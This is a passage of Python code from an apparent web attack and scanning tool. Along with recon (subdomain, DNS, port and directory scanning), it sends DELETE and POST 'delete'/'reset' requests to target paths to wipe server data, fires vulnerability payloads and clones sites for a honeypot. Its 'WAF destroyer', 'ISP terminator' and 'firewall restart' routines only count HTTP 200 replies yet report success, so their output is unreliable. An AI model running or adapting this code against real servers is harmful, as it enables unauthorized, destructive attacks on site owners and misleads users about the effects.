            print(Fore.FACTORY + "[6] Factory Restart...")
            self.factory_restart_all_servers()

        print(Fore.ERROR500 + f"\n[!!!] 500 DETECTED: {detected}")
        print(Fore.OKGREEN + f"[+] 500 DESTROYED: {destroyed}" + Fore.RESET)
        return detected, destroyed

    def _destroy_429(self, server_name, url, path):
        try:
            self.session.delete(url, timeout=3, verify=False)
            self.session.post(url, data={'action': 'reset', 'error': '429'}, timeout=3, verify=False)
            print_destroyer(server_name, path, "429-DESTROYED")
            return True
        except Exception:
            return False

    def _destroy_500(self, server_name, url, path):
        try:
            self.session.delete(url, timeout=3, verify=False)
            self.session.post(url, data={'action': 'reset', 'error': '500'}, timeout=3, verify=False)
            print_destroyer(server_name, path, "500-DESTROYED")
            return True
        except Exception:
            return False

    def destroy_all_errors(self):
        print(Fore.DESTROYER + "\n" + "=" * 80)
        print(Fore.DESTROYER + "[!!!] 5000 FULL ERROR DESTROYER - 429 + 500")
        print(Fore.DESTROYER + "=" * 80)
        self.detect_and_destroy_error_429()
        self.detect_and_destroy_error_500()

    # ============================================
    # WAF/ISP
    # ============================================
    def detect_waf(self, server_name=None):
        print(Fore.WAF + "\n[!!!] 5000 WAF DETECTOR" + Fore.RESET)
        servers = [server_name] if server_name else ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']
        detected = 0
        for srv in servers:
            for path in SERVER_SUSPICIOUS_DATABASE.get(srv, {}).get('suspicious_paths', [])[:10]:
                try:
                    test_url = f"{self.base_url}{path}"
                    r = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)
                    headers_str = str(r.headers).lower()
                    content_str = r.text.lower()[:2000]
                    for waf_name, signatures in WAF_SIGNATURES.items():
                        for sig in signatures:
                            if sig in headers_str or sig in content_str:
                                detected += 1
                                self.waf_isp_stats['waf_detected'] += 1
                                print_waf(srv, path, f"- {waf_name}")
                                break
                except Exception:
                    pass
        print(Fore.WAF + f"\n[!!!] WAF DETECTED: {detected}")
        return detected

    def destroy_waf(self, server_name=None):
        print(Fore.WAF + "\n[!!!] 5000 WAF DESTROYER" + Fore.RESET)
        servers = [server_name] if server_name else ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']
        destroyed = 0
        for srv in servers:
            for category, patterns in WAF_IP_BLOCK_PATTERNS.items():
                for pattern in patterns:
                    try:
                        test_url = f"{self.base_url}{pattern}"
                        r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                        if r.status_code in [200, 201, 202, 204, 301, 302]:
                            destroyed += 1
                            self.waf_isp_stats['waf_destroyed'] += 1
                            print_terminator(srv, pattern, f"WAF-{category.upper()}")
                    except Exception:
                        pass
        print(Fore.TERMINATOR + f"[TERMINATOR] WAF DESTROYED: {destroyed}" + Fore.RESET)
        return destroyed

    def detect_isp_block(self, server_name=None):
        print(Fore.ISP + "\n[!!!] 5000 ISP DETECTOR" + Fore.RESET)
        servers = [server_name] if server_name else ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']
        detected = 0
        for srv in servers:
            try:
                r = requests.get(f"http://ip-api.com/json/{self.ip}", timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if data.get('status') == 'success':
                        detected += 1
                        self.waf_isp_stats['isp_detected'] += 1
                        print_isp(srv, data.get('isp', 'N/A'), f"AS: {data.get('as', 'N/A')}")
            except Exception:
                pass
        print(Fore.ISP + f"\n[!!!] ISP DETECTED: {detected}")
        return detected

    def terminate_isp(self, server_name=None):
        print(Fore.TERMINATOR + "\n[!!!] 5000 ISP TERMINATOR" + Fore.RESET)
        servers = [server_name] if server_name else ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']
        terminated = 0
        for srv in servers:
            for category, patterns in ISP_BLOCK_PATTERNS.items():
                for pattern in patterns:
                    try:
                        test_url = f"{self.base_url}{pattern}"
                        r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                        if r.status_code in [200, 201, 202, 204, 301, 302]:
                            terminated += 1
                            self.waf_isp_stats['isp_terminated'] += 1
                            print_terminator(srv, pattern, f"ISP-{category.upper()}")
                    except Exception:
                        pass
        print(Fore.TERMINATOR + f"[!!!] ISP TERMINATED: {terminated}" + Fore.RESET)
        return terminated

    def waf_isp_full_scan(self):
        print(Fore.TERMINATOR + "\n[!!!] 5000 WAF/ISP FULL SCAN" + Fore.RESET)
        self.detect_waf()
        self.destroy_waf()
        self.detect_isp_block()
        self.terminate_isp()

    # ============================================
    # RESTART
    # ============================================
    def restart_firewall(self, server_name=None):
        servers = [server_name] if server_name else ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']
        restarted = 0
        for srv in servers:
            for category in ['restart_firewall', 'restart_waf']:
                for pattern in RESTART_PATTERNS.get(category, []):
                    try:
                        test_url = f"{self.base_url}{pattern}"
                        r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                        if r.status_code in [200, 201, 202, 204, 301, 302]:
                            restarted += 1
                            self.enable_unblock_stats['firewall_restarted'] += 1
                            print_restart(srv, pattern, "FIREWALL-RESTART")
                    except Exception:
                        pass
        return restarted

    def restart_isp(self, server_name=None):
        servers = [server_name] if server_name else ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']
        restarted = 0
        for srv in servers:
            for pattern in RESTART_PATTERNS.get('restart_isp', []):
                try:
                    test_url = f"{self.base_url}{pattern}"
                    r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                    if r.status_code in [200, 201, 202, 204, 301, 302]:
                        restarted += 1
                        self.enable_unblock_stats['isp_restarted'] += 1
                        print_restart(srv, pattern, "ISP-RESTART")
                except Exception:
                    pass
        return restarted

    def restart_waf(self, server_name=None):
        servers = [server_name] if server_name else ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']
        restarted = 0
        for srv in servers:
            for pattern in RESTART_PATTERNS.get('restart_waf', []):
                try:
                    test_url = f"{self.base_url}{pattern}"
                    r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                    if r.status_code in [200, 201, 202, 204, 301, 302]:
                        restarted += 1
                        self.enable_unblock_stats['waf_restarted'] += 1
                        print_restart(srv, pattern, "WAF-RESTART")
                except Exception:
                    pass
        return restarted

    def restart_server(self, server_name=None):
        servers = [server_name] if server_name else ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']
        restarted = 0
        for srv in servers:
            for pattern in RESTART_PATTERNS.get('restart_server', []):
                try:
                    test_url = f"{self.base_url}{pattern}"
                    r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                    if r.status_code in [200, 201, 202, 204, 301, 302]:
                        restarted += 1
                        self.enable_unblock_stats['server_restarted'] += 1
                        print_restart(srv, pattern, "SERVER-RESTART")
                except Exception:
                    pass
        return restarted

    def restart_application(self, server_name=None):
        servers = [server_name] if server_name else ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']
        restarted = 0
        for srv in servers:
            for category in ['restart_application', 'restart_service']:
                for pattern in RESTART_PATTERNS.get(category, []):
                    try:
                        test_url = f"{self.base_url}{pattern}"
                        r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                        if r.status_code in [200, 201, 202, 204, 301, 302]:
                            restarted += 1
                            self.enable_unblock_stats['application_restarted'] += 1
                            print_restart(srv, pattern, f"{category.upper()}")
                    except Exception:
                        pass
        return restarted

    def restart_all(self, server_name=None):
        servers = [server_name] if server_name else ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']
        restarted = 0
        for srv in servers:
            for pattern in RESTART_PATTERNS.get('restart_all', []):
                try:
                    test_url = f"{self.base_url}{pattern}"
                    r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                    if r.status_code in [200, 201, 202, 204, 301, 302]:
                        restarted += 1
                        self.enable_unblock_stats['all_restarted'] += 1
                        print_restart(srv, pattern, "RESTART-ALL")
                except Exception:
                    pass
        return restarted

    # ============================================
    # ISP ENABLE / IP UNBLOCK
    # ============================================
    def enable_isp(self, server_name=None):
        servers = [server_name] if server_name else ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']
        enabled = 0
        for srv in servers:
            for category, patterns in ISP_ENABLE_PATTERNS.items():
                if 'enable' not in category and 'restore' not in category:
                    continue
                for pattern in patterns:
                    try:
                        test_url = f"{self.base_url}{pattern}"
                        r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                        if r.status_code in [200, 201, 202, 204, 301, 302]:
                            enabled += 1
                            self.enable_unblock_stats['isp_enabled'] += 1
                            print_enable(srv, pattern, "ISP-ENABLE")
                    except Exception:
                        pass
        return enabled

    def unblock_all_ips(self, server_name=None):
        servers = [server_name] if server_name else ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']
        unblocked = 0
        for srv in servers:
            for category, patterns in ISP_ENABLE_PATTERNS.items():
                if 'unblock' not in category and 'remove' not in category and 'clear' not in category:
                    continue
                for pattern in patterns:
                    try:
                        test_url = f"{self.base_url}{pattern}"
                        r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                        if r.status_code in [200, 201, 202, 204, 301, 302]:
                            unblocked += 1
                            self.enable_unblock_stats['ips_unblocked'] += 1
                            print_unblock(srv, pattern, "IP-UNBLOCK")
                    except Exception:
                        pass
        return unblocked

    def enable_unblock_full_scan(self):
        print(Fore.ENABLE + "\n[!!!] 5000 ENABLE/UNBLOCK/RESTART FULL SCAN" + Fore.RESET)
        self.enable_isp()
        self.unblock_all_ips()
        self.restart_firewall()
        self.restart_isp()
        self.restart_waf()
        self.restart_server()
        self.restart_application()
        self.restart_all()
        print(Fore.ENABLE + "\n[!!!] FINAL REPORT")
        for key, value in self.enable_unblock_stats.items():
            print(Fore.OKGREEN + f"[+] OKAY - {key}: {value}" + Fore.RESET)

    # ============================================
    # RECON FEATURES
    # ============================================
    def subdomain_enumeration(self):
        print(Fore.FUTURE + "\n" + "=" * 80)
        print(Fore.FUTURE + "[*] 5000 SUBDOMAIN ENUMERATION")
        print(Fore.FUTURE + "=" * 80)
        self.subdomain_results = []
        subs = ['www', 'mail', 'ftp', 'webmail', 'smtp', 'ns1', 'ns2', 'cpanel',
                'm', 'imap', 'test', 'ns', 'blog', 'pop3', 'dev', 'admin',
                'forum', 'news', 'vpn', 'old', 'support', 'mobile', 'docs',
                'beta', 'shop', 'secure', 'demo', 'web', 'media', 'email',
                'images', 'download', 'dns', 'api', 'cdn', 'app', 'staging',
                'portal', 'intranet', 'git', 'jenkins', 'jira', 'nexus']
        found = 0
        for i, sub in enumerate(subs, 1):
            print_progress(i, len(subs), f"Subdomain: {sub}")
            try:
                full = f"{sub}.{self.hostname}"
                test_url = f"{self.protocol}://{full}:{self.port}"
                r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                if r.status_code in [200, 301, 302, 401, 403]:
                    self.subdomain_results.append({
                        'subdomain': sub, 'domain': full, 'status': r.status_code,
                    })
                    found += 1
                    print()
                    print_okay(f"Subdomain found", f"{full} ({r.status_code})")
            except Exception:
                pass
        print(Fore.FUTURE + f"\n[*] Total Subdomains: {found}/{len(subs)}")
        return self.subdomain_results

    def dns_enumeration(self):
        print(Fore.FUTURE + "\n" + "=" * 80)
        print(Fore.FUTURE + "[*] 5000 DNS ENUMERATION")
        print(Fore.FUTURE + "=" * 80)
        self.dns_results = {'A': [], 'AAAA': [], 'MX': [], 'NS': [], 'TXT': [],
                            'CNAME': [], 'SOA': [], 'PTR': [], 'SRV': []}
        for dns_type in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA', 'PTR', 'SRV']:
            try:
                import dns.resolver
                answers = dns.resolver.resolve(self.hostname, dns_type)
                for rdata in answers:
                    self.dns_results[dns_type].append(str(rdata))
                    print_okay(f"DNS {dns_type}", str(rdata))
            except ImportError:
                if dns_type == 'A':
                    try:
                        ips = socket.getaddrinfo(self.hostname, None, socket.AF_INET)
                        for ip in ips:
                            self.dns_results['A'].append(ip[4][0])
                            print_okay(f"DNS A", ip[4][0])
                    except Exception:
                        pass
            except Exception:
                pass
        total = sum(len(v) for v in self.dns_results.values())
        print(Fore.FUTURE + f"\n[*] DNS Records: {total}")
        return self.dns_results

    def whois_lookup(self):
        print(Fore.FUTURE + "\n" + "=" * 80)
        print(Fore.FUTURE + "[*] 5000 WHOIS LOOKUP")
        print(Fore.FUTURE + "=" * 80)
        self.whois_results = {}
        try:
            import whois
            w = whois.whois(self.hostname)
            self.whois_results = {
                'domain_name': str(w.domain_name) if w.domain_name else 'N/A',
                'registrar': str(w.registrar) if w.registrar else 'N/A',
                'creation_date': str(w.creation_date) if w.creation_date else 'N/A',
                'expiration_date': str(w.expiration_date) if w.expiration_date else 'N/A',
            }
            for key, value in self.whois_results.items():
                if value and value != 'N/A':
                    print_okay(f"WHOIS {key}", str(value)[:100])
        except ImportError:
            print(Fore.YELLOW + "[!] python-whois not installed")
        except Exception as e:
            print(Fore.RED + f"[-] WHOIS error: {e}")
        return self.whois_results

    def ssl_certificate_analysis(self):
        print(Fore.FUTURE + "\n" + "=" * 80)
        print(Fore.FUTURE + "[*] 5000 SSL CERTIFICATE ANALYSIS")
        print(Fore.FUTURE + "=" * 80)
        self.ssl_results = {}
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            with socket.create_connection((self.hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=self.hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()
                    self.ssl_results = {
                        'version': version, 'cipher': cipher,
                        'notBefore': cert.get('notBefore', 'N/A'),
                        'notAfter': cert.get('notAfter', 'N/A'),
                    }
                    print_okay(f"SSL Version", version)
                    print_okay(f"SSL Cipher", f"{cipher[0]} ({cipher[1]} bits)")
                    print_okay(f"Valid From", self.ssl_results['notBefore'])
                    print_okay(f"Valid Until", self.ssl_results['notAfter'])
        except Exception as e:
            print(Fore.RED + f"[-] SSL error: {e}")
        return self.ssl_results

    def header_enumeration(self):
        print(Fore.FUTURE + "\n" + "=" * 80)
        print(Fore.FUTURE + "[*] 5000 HEADER ENUMERATION")
        print(Fore.FUTURE + "=" * 80)
        self.header_results = {}
        try:
            r = self.session.get(self.base_url, timeout=10, verify=False)
            for header, value in r.headers.items():
                self.header_results[header] = value
                print_okay(f"Header: {header}", value[:100])
        except Exception as e:
            print(Fore.RED + f"[-] Header error: {e}")
        return self.header_results

    def isp_information(self):
        print(Fore.FUTURE + "\n" + "=" * 80)
        print(Fore.FUTURE + "[*] 5000 ISP INFORMATION")
        print(Fore.FUTURE + "=" * 80)
        self.isp_results = {}
        try:
            r = requests.get(f"http://ip-api.com/json/{self.ip}", timeout=10)
            if r.status_code == 200:
                data = r.json()
                if data.get('status') == 'success':
                    self.isp_results = {
                        'ip': data.get('query', 'N/A'),
                        'isp': data.get('isp', 'N/A'),
                        'org': data.get('org', 'N/A'),
                        'as': data.get('as', 'N/A'),
                        'country': data.get('country', 'N/A'),
                        'region': data.get('regionName', 'N/A'),
                        'city': data.get('city', 'N/A'),
                    }
                    for key, value in self.isp_results.items():
                        print_okay(f"ISP {key}", str(value))
        except Exception as e:
            print(Fore.RED + f"[-] ISP error: {e}")
        return self.isp_results

    def directory_bruteforce(self):
        print(Fore.FUTURE + "\n" + "=" * 80)
        print(Fore.FUTURE + "[*] 5000 DIRECTORY BRUTEFORCE")
        print(Fore.FUTURE + "=" * 80)
        self.directory_results = []
        wordlist = DEFAULT_DIRECTORY_WORDLIST
        if self.args and self.args.wordlist:
            try:
                with open(self.args.wordlist, 'r') as f:
                    wordlist = [line.strip() for line in f if line.strip()]
            except Exception:
                pass
        found = 0
        for i, word in enumerate(wordlist, 1):
            print_progress(i, len(wordlist), f"Dir: /{word}")
            try:
                test_url = f"{self.base_url}/{word}"
                r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                if r.status_code in [200, 301, 302, 401, 403]:
                    self.directory_results.append({
                        'path': f"/{word}", 'url': test_url, 'status': r.status_code,
                    })
                    found += 1
                    print()
                    print_suspicious('DIR', f"/{word}", r.status_code)
            except Exception:
                pass
        print(Fore.FUTURE + f"\n[*] Directories: {found}/{len(wordlist)}")
        return self.directory_results

    def port_scan(self):
        print(Fore.FUTURE + "\n" + "=" * 80)
        print(Fore.FUTURE + "[*] 5000 PORT SCAN")
        print(Fore.FUTURE + "=" * 80)
        self.port_scan_results = []
        ports = COMMON_PORTS
        if self.args and hasattr(self.args, 'ports') and self.args.ports:
            ports = self.args.ports
        found = 0
        for i, port in enumerate(ports, 1):
            print_progress(i, len(ports), f"Port: {port}")
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.ip, port))
                sock.close()
                if result == 0:
                    self.port_scan_results.append({'port': port, 'status': 'open'})
                    found += 1
                    print()
                    print_okay(f"Port {port} OPEN", "")
            except Exception:
                pass
        print(Fore.FUTURE + f"\n[*] Open Ports: {found}/{len(ports)}")
        return self.port_scan_results

    def crawler_spider(self):
        print(Fore.FUTURE + "\n" + "=" * 80)
        print(Fore.FUTURE + "[*] 5000 CRAWLER / SPIDER")
        print(Fore.FUTURE + "=" * 80)
        self.crawler_results = []
        visited = set()
        queue = deque([self.base_url])
        max_pages = 50
        pages = 0
        while queue and pages < max_pages:
            url = queue.popleft()
            if url in visited:
                continue
            visited.add(url)
            try:
                r = self.session.get(url, timeout=5, verify=False)
                pages += 1
                self.crawler_results.append({
                    'url': url, 'status': r.status_code, 'size': len(r.content),
                })
                print(Fore.CYAN + f"[*] Crawled [{pages}/{max_pages}]: {url}" + Fore.RESET)
                links = re.findall(r'href=["\'](.*?)["\']', r.text)
                for link in links:
                    full = parse.urljoin(url, link)
                    if full.startswith(self.base_url) and full not in visited:
                        queue.append(full)
            except Exception:
                pass
        print(Fore.FUTURE + f"\n[*] Pages Crawled: {pages}")
        return self.crawler_results

    def vulnerability_scanning(self):
        print(Fore.FUTURE + "\n" + "=" * 80)
        print(Fore.FUTURE + "[*] 5000 VULNERABILITY SCANNING")
        print(Fore.FUTURE + "=" * 80)
        self.vuln_scan_results = []
        for vuln_type, payloads in VULN_PATTERNS.items():
            for payload in payloads:
                try:
                    test_url = f"{self.base_url}?test={parse.quote(payload)}"
                    r = self.session.get(test_url, timeout=5, verify=False)
                    if vuln_type == 'XSS' and payload in r.text:
                        self.vuln_scan_results.append({
                            'url': test_url, 'type': vuln_type, 'payload': payload,
                        })
                        print(Fore.RED + f"[!] VULN: {vuln_type} at {test_url}" + Fore.RESET)
                except Exception:
                    pass
        if not self.vuln_scan_results:
            print_okay("No obvious vulnerabilities detected")
        print(Fore.FUTURE + f"\n[*] Potential Vulnerabilities: {len(self.vuln_scan_results)}")
        return self.vuln_scan_results

    # ============================================
    # 5000: Pattern Scanner
    # ============================================
    def _scan_patterns(self, patterns_dict, name, color=Fore.FUTURE):
        results = {'systems': [], 'total_found': 0}
        for stype, patterns in patterns_dict.items():
            for pattern in patterns:
                try:
                    test_url = f"{self.base_url}{pattern}"
                    r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                    if r.status_code in [200, 301, 302, 401, 403]:
                        results['systems'].append({'type': stype, 'path': pattern, 'status': r.status_code})
                        results['total_found'] += 1
                        print_suspicious(name.upper(), f"{stype} - {pattern}", r.status_code)
                except Exception:
                    pass
        return results

    def run_pattern_feature(self, name, patterns, color):
        print(color + "\n" + "=" * 80)
        print(color + f"[*] 5000 {name.upper().replace('_', ' ')}")
        print(color + "=" * 80)
        result = self._scan_patterns(patterns, name, color)
        self.results_5000[name] = result
        if not result['systems']:
            print_okay(f"No {name.replace('_', ' ')} exposed")
        print(color + f"\n[*] Total: {result['total_found']}")
        return result

    def run_supreme_5000(self):
        return self.run_pattern_feature('supreme_5000', SUPREME_5000_PATTERNS, Fore.SUPREME5000)

    def run_singularity_5000(self):
        return self.run_pattern_feature('singularity_5000', SINGULARITY_5000_PATTERNS, Fore.SINGULARITY)

    def run_hypernova_5000(self):
        return self.run_pattern_feature('hypernova_5000', HYPERNOVA_5000_PATTERNS, Fore.HYPERNOVA)

    def run_honeypot_5000_patterns(self):
        return self.run_pattern_feature('honeypot_5000', HONEYPOT_5000_PATTERNS, Fore.HONEYPOT_SERVER)

    def run_cleaner_5000_patterns(self):
        return self.run_pattern_feature('cleaner_5000', CLEANER_5000_PATTERNS, Fore.CLEANER)

    def run_factory_5000_patterns(self):
        return self.run_pattern_feature('factory_5000', FACTORY_5000_PATTERNS, Fore.FACTORY)

    def run_token_5000_patterns(self):
        return self.run_pattern_feature('token_5000', TOKEN_5000_PATTERNS, Fore.TOKEN)

    # ============================================
    # SERVER CONNECTION & SUSPICIOUS
    # ============================================
    def build_server_connection_map(self):
        print(Fore.CYAN + "\n" + "=" * 80)
        print(Fore.CYAN + "[*] 5000 SERVER CONNECTION MAP")
        print(Fore.CYAN + "=" * 80)
        self.server_connection_map_data = {}
        for name, info in SERVER_CONNECTION_MAP.items():
            connected = False
            for path in SERVER_SUSPICIOUS_DATABASE.get(name, {}).get('suspicious_paths', [])[:5]:
                try:
                    test_url = f"{self.base_url}{path}"
                    r = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)
                    if r.status_code in [200, 301, 302, 403]:
                        connected = True
                        print_okay(f"{name} connected", test_url)
                        break
                except Exception:
                    pass
            self.server_connection_map_data[name] = {'connected': connected}
        count = sum(1 for s in self.server_connection_map_data.values() if s['connected'])
        print(Fore.OKGREEN + f"\n[+] Connected: {count}/{len(self.server_connection_map_data)}" + Fore.RESET)
        return self.server_connection_map_data

    def _check_server_suspicious(self, server_name):
        found = []
        for path in SERVER_SUSPICIOUS_DATABASE.get(server_name, {}).get('suspicious_paths', [])[:30]:
            try:
                test_url = f"{self.base_url}{path}"
                r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                if r.status_code in [200, 301, 302, 401, 403]:
                    self.server_suspicious_found[server_name].append({
                        'server': server_name, 'path': path, 'status': r.status_code,
                    })
                    found.append(path)
                    print_suspicious(server_name, path, r.status_code)
                elif r.status_code == 429:
                    self._destroy_429(server_name, test_url, path)
                elif r.status_code == 500:
                    self._destroy_500(server_name, test_url, path)
            except Exception:
                pass
        if not found:
            print_okay(f"{server_name}: No suspicious systems found")

    def full_server_suspicious_check(self):
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "[!!!] 5000 FULL SERVER SUSPICIOUS CHECK")
        print(Fore.RED + "=" * 80)
        for name in ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']:
            self._check_server_suspicious(name)
        total = sum(len(v) for v in self.server_suspicious_found.values())
        print(Fore.CYAN + f"\n[*] Total Suspicious: {total}")
        return self.server_suspicious_found

    # ============================================
    # COOKIES DELETE (clean flags)
    # ============================================
    def delete_server_cookies_data(self, server_name):
        if server_name not in SERVER_COOKIES_MAP:
            return []
        targets = SERVER_COOKIES_MAP[server_name]
        deleted = []
        total = sum(len(p) for p in targets.values())
        cur = 0
        for category, paths in targets.items():
            for path in paths:
                cur += 1
                print_progress(cur, total, f"{server_name}/{category}: {path}")
                try:
                    test_url = f"{self.base_url}{path}"
                    r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                    if r.status_code in [200, 301, 302, 403]:
                        self.session.delete(test_url, timeout=3, verify=False)
                        self.session.post(test_url, data={'action': 'delete'}, timeout=3, verify=False)
                        print_delete_okay(server_name, f"{category}: {path}")
                        deleted.append({'server': server_name, 'category': category, 'path': path})
                        self.cookies_data_deleted_okay.append(deleted[-1])
                        self.total_okay += 1
                except Exception:
                    pass
        return deleted

    def delete_all_servers_cookies_data(self):
        print(Fore.RED + "\n[!!!] 5000 DELETE COOKIES - ALL SERVERS" + Fore.RESET)
        self.cookies_data_deleted_okay = []
        self.total_okay = 0
        for name in ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']:
            self.delete_server_cookies_data(name)
        print(Fore.OKGREEN + f"\n[+] TOTAL OKAY: {self.total_okay}" + Fore.RESET)

    def delete_complete_server_data(self, server_name):
        if server_name not in SERVER_COOKIES_MAP:
            return []
        all_targets = []
        for cat, paths in SERVER_COOKIES_MAP[server_name].items():
            for path in paths:
                all_targets.append((cat, path))
        for path in SERVER_SUSPICIOUS_DATABASE.get(server_name, {}).get('suspicious_paths', []):
            all_targets.append(('suspicious', path))
        seen = set()
        unique = []
        for cat, path in all_targets:
            if path not in seen:
                seen.add(path)
                unique.append((cat, path))
        deleted = []
        for i, (cat, path) in enumerate(unique, 1):
            print_progress(i, len(unique), f"{server_name}: {path}")
            try:
                test_url = f"{self.base_url}{path}"
                r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                if r.status_code in [200, 301, 302, 403]:
                    self.session.delete(test_url, timeout=3, verify=False)
                    self.session.post(test_url, data={'action': 'delete'}, timeout=3, verify=False)
                    print_delete_okay(server_name, f"{cat}: {path}")
                    self.cookies_site_data_deleted_okay.append({
                        'server': server_name, 'category': cat, 'path': path,
                    })
                    self.total_okay += 1
            except Exception:
                pass
        return deleted

    def delete_all_servers_complete_data(self):
        print(Fore.RED + "\n[!!!] 5000 DELETE COMPLETE DATA - ALL SERVERS" + Fore.RESET)
        self.cookies_site_data_deleted_okay = []
        self.total_okay = 0
        for name in ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']:
            self.delete_complete_server_data(name)
        print(Fore.OKGREEN + f"\n[+] TOTAL OKAY: {self.total_okay}" + Fore.RESET)

    def check_and_delete_all_server_data(self):
        print(Fore.RED + "\n[!!!] 5000 CHECK & DELETE ALL" + Fore.RESET)
        self.build_server_connection_map()
        self.full_server_suspicious_check()
        self.destroy_all_errors()
        self.waf_isp_full_scan()
        self.enable_unblock_full_scan()
        self.detect_honeypot()
        self.destroy_honeypot()
        self.cleaner_data_all_servers()
        self.destroy_tokens_all_servers()
        self.factory_restart_all_servers()
        self.delete_all_servers_cookies_data()
        self.delete_all_servers_complete_data()

    # ============================================
    # SECURITY & RISK
    # ============================================
    def security_audit(self):
        print(Fore.YELLOW + "\n[!!!] 5000 SECURITY AUDIT" + Fore.RESET)
        try:
            r = self.session.get(self.base_url, timeout=10, verify=False)
            for h in ['Strict-Transport-Security', 'X-Frame-Options',
                      'X-Content-Type-Options', 'X-XSS-Protection',
                      'Content-Security-Policy', 'Referrer-Policy']:
                if h in r.headers:
                    print_okay(f"Header: {h}")
                else:
                    print(Fore.YELLOW + f"[!] Missing: {h}")
        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")

    def data_leak_detector(self):
        print(Fore.RED + "\n[!!!] 5000 DATA LEAK DETECTOR" + Fore.RESET)
        self.data_leak_findings = []
        patterns = {
            'Email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'API Key': r'(?:api[_-]?key|apikey)["\']?\s*[:=]\s*["\']([a-zA-Z0-9\-_.]{20,})["\']',
            'Token': r'(?:token|bearer)\s+([a-zA-Z0-9\-_.]{20,})',
        }
        try:
            r = self.session.get(self.base_url, timeout=10, verify=False)
            for lt, pat in patterns.items():
                matches = re.findall(pat, r.text, re.IGNORECASE)
                if matches:
                    self.data_leak_findings.append({'type': lt, 'count': len(matches)})
                    print(Fore.RED + f"[!] {lt} Leak: {len(matches)} found")
            if not self.data_leak_findings:
                print_okay("No data leaks detected")
        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")
        return self.data_leak_findings

    def risk_assessment_5000(self):
        print(Fore.MAGENTA + "\n[!!!] 5000 RISK ASSESSMENT" + Fore.RESET)
        self.risk_assessment = {'score': 0, 'level': 'LOW'}
        total = sum(len(v) for v in self.server_suspicious_found.values())
        if total > 20:
            self.risk_assessment['score'] += 30
        elif total > 5:
            self.risk_assessment['score'] += 15
        if self.honeypot_stats['honeypot_detected'] > 0:
            self.risk_assessment['score'] += 15
        if self.risk_assessment['score'] >= 70:
            self.risk_assessment['level'] = 'CRITICAL'
        elif self.risk_assessment['score'] >= 50:
            self.risk_assessment['level'] = 'HIGH'
        elif self.risk_assessment['score'] >= 30:
            self.risk_assessment['level'] = 'MEDIUM'
        print(Fore.CYAN + f"[*] Risk Score: {self.risk_assessment['score']}/100")
        print(Fore.CYAN + f"[*] Risk Level: {self.risk_assessment['level']}")
        return self.risk_assessment

    # ============================================
    # HONEYPOT SERVER
    # ============================================
    def deploy_honeypot_server(self, host=None, port=None, url=None):
        print(Fore.HONEYPOT_SERVER + "\n" + "=" * 80)
        print(Fore.HONEYPOT_SERVER + "[!!!] 5000 HONEYPOT SERVER DEPLOYMENT")
        print(Fore.HONEYPOT_SERVER + "=" * 80)

        if not TWISTED_AVAILABLE:
            print_honeypot_server("[-] Twisted not installed")
            return None

        hp_host = host or (self.args.hp_host if self.args and hasattr(self.args, 'hp_host') else DEFAULT_HONEYPOT_HOST)
        hp_port = port or (self.args.hp_port if self.args and hasattr(self.args, 'hp_port') else DEFAULT_HONEYPOT_PORT)
        hp_url = url or (self.args.hp_url if self.args and hasattr(self.args, 'hp_url') else self.target)
        log_file = os.path.join(script_dir, "http_honeypot_5000.log")

        print_honeypot_server(f"[*] Host: {hp_host}")
        print_honeypot_server(f"[*] Port: {hp_port}")
        print_honeypot_server(f"[*] Clone URL: {hp_url}")

        if hp_port < 1024 and os.geteuid() != 0:
            print_honeypot_server(f"[-] Port {hp_port} requires root")
            return None

        avail, reason = is_port_available(hp_host, hp_port)
        if not avail:
            print_honeypot_server(f"[-] Port {hp_port} not available: {reason}")
            return None

        try:
            proc, temp_script = run_honeypot_server_subprocess(hp_host, hp_port, hp_url, log_file)
            if proc is None:
                return None

            self.honeypot_server_stats.update({
